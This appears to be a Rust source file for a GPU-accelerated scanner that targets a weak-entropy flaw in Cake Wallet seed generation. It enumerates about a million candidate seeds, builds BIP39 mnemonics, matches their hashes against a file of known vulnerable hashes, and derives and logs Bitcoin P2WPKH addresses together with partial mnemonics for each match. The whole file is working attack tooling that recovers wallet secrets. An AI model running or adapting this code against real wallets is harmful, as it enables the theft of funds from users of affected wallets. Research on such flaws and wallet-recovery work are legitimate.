#[cfg(feature = "gpu")]
use crate::scans::gpu_solver::GpuSolver;
use anyhow::Result;
use bitcoin::{Address, CompressedPublicKey, Network};
use bip39::Mnemonic;
use sha2::{Digest, Sha256};
use tracing::{info, warn};
use std::collections::HashSet;
use std::fs;

/// Cake Wallet Targeted Scanner
/// Validates official vulnerable mnemonic hashes against generated seeds
/// Generates P2WPKH addresses for confirmed matches (GPU Accelerated)
pub fn run_targeted() -> Result<()> {
    info!("Cake Wallet Targeted Vulnerability Scanner (GPU)");
    info!("Loading official vulnerable mnemonic hashes...");

    // Load vulnerable hashes
    let hashes_file =
        fs::read_to_string("data/cakewallet_vulnerable_hashes.txt").unwrap_or_else(|_| "".to_string());

    let vulnerable_hashes: HashSet<String> = hashes_file
        .lines()
        .map(|line| line.trim().to_lowercase())
        .filter(|line| !line.is_empty())
        .collect();

    info!(
        "Loaded {} vulnerable mnemonic hashes",
        vulnerable_hashes.len()
    );
    info!("Initializing GPU Solver...");

    #[cfg(not(feature = "gpu"))]
    {
        anyhow::bail!(
            "This scanner requires GPU acceleration. Please recompile with --features gpu"
        );
    }

    #[cfg(feature = "gpu")]
    let solver = GpuSolver::new()?;

    #[cfg(feature = "gpu")]
    {
        let network = Network::Bitcoin;

        info!("Scanning 1,048,576 possible seeds...");

        let mut checked = 0;
        let mut found = 0;

        // Batch for GPU processing: Store seed indices
        let mut batch: Vec<u32> = Vec::with_capacity(1024);
        // Store corresponding mnemonic info for logging
        let mut batch_info: Vec<(u32, String, String)> = Vec::with_capacity(1024);

        for seed_index in 0..1_048_576 {
            // Generate entropy (CPU - fast)
            let entropy_hi = (seed_index as u64) << 44;
            let entropy_lo = 0u64;
            let mut entropy = [0u8; 16];
            entropy[0..8].copy_from_slice(&entropy_hi.to_be_bytes());
            entropy[8..16].copy_from_slice(&entropy_lo.to_be_bytes());

            if let Ok(mnemonic) = Mnemonic::from_entropy(&entropy[0..16]) {
                let mnemonic_str = mnemonic.to_string();
                let mut hasher = Sha256::new();
                hasher.update(mnemonic_str.as_bytes());
                let hash_hex = hex::encode(hasher.finalize());

                // Check if vulnerable
                if vulnerable_hashes.contains(&hash_hex) {
                    found += 1;
                    batch.push(seed_index as u32);
                    batch_info.push((seed_index as u32, mnemonic_str.clone(), hash_hex.clone()));

                    warn!(
                        "[VULNERABLE] Seed Match #{}: {} -> Hash: {}",
                        seed_index,
                        &mnemonic_str[..30],
                        &hash_hex[..16]
                    );
                }
            }

            checked += 1;
            if checked % 100_000 == 0 {
                info!(
                    "Progress: {:.1}% - Found: {}",
                    (checked as f64 / 1_048_576.0) * 100.0,
                    found
                );
            }

            // Process Batch
            if batch.len() >= 1000 || (checked == 1_048_576 && !batch.is_empty()) {
                // Send to GPU
                let results = solver.compute_cake_batch_full(&batch)?;

                // Process results
                for (i, _seed_idx) in batch.iter().enumerate() {
                    // Results are flat: 40 public keys per seed
                    // Order: Change 0 (20 addrs), Change 1 (20 addrs)
                    let base = i * 40;

                    for change in 0..=1 {
                        for idx in 0..20 {
                            let key_idx = base + (change as usize * 20) + idx as usize;
                            let pubkey_bytes = results[key_idx];

                            // Create P2WPKH Address from Compressed Public Key (33 bytes)
                            if let Ok(pubkey) = bitcoin::PublicKey::from_slice(&pubkey_bytes) {
                                let compressed = CompressedPublicKey(pubkey.inner);
                                let address = Address::p2wpkh(&compressed, network);
                                warn!("  ADDRESS m/0'/{}/{}: {}", change, idx, address);
                            } else {
                                warn!("  ADDRESS m/0'/{}/{}: Invalid Pubkey from GPU", change, idx);
                            }
                        }
                    }
                }

                batch.clear();
                batch_info.clear();
            }
        }

        info!("\nScan complete!");
        info!("Total seeds checked: {}", checked);
        info!("Vulnerable seeds found: {}", found);
        Ok(())
    }
}
